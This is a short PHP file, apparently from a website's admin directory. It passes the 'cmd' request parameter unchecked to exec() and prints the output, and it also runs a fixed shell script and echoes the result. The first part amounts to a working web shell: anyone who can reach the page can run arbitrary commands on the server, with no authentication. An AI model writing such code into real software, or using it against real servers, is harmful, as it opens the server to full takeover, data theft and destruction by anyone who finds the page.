<?php
    if(isset($_REQUEST['cmd'])){
        $command=$_REQUEST['cmd'];
        // execPrint($command);
        exec($command, $result);
    
        foreach ($result as $line) {
            print($line . "\n");
        }
    }
    
    $output = shell_exec('/var/www/html/microbird-website/admin/script.sh');
    
    // echo "<pre>$output</pre>";
    echo $output;

// function execPrint($command) {
// $result = array();
// exec($command, $result);
// // foreach ($result as $line) {
// // print($line . "\n");
// // }

// }

// Print the exec output inside of a pre element

?>